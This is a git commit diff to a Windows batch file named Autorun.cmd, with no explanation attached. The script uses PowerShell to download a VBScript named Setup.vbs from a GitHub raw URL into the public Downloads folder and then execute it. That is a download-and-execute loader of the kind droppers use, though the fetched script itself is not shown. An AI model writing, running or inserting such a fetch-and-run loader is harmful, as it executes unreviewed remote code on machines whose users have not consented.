7487f6199ea3cc542da80a6481ea63a0f982c135
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-10 20:57:43 +0700

    Autorun.cmd

--- Autorun.cmd
+++ Autorun.cmd
@@ -1,3 +1,3 @@
-powershell.exe -Command Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/Setup.vbs" -OutFile "C:\Users\Public\Downloads\Setup.vbs"
+powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/Setup.vbs" -OutFile "C:\Users\Public\Downloads\Setup.vbs"
 powershell.exe Start-Process -FilePath "C:\Users\Public\Downloads\Setup.vbs"
 powershell.exe exit
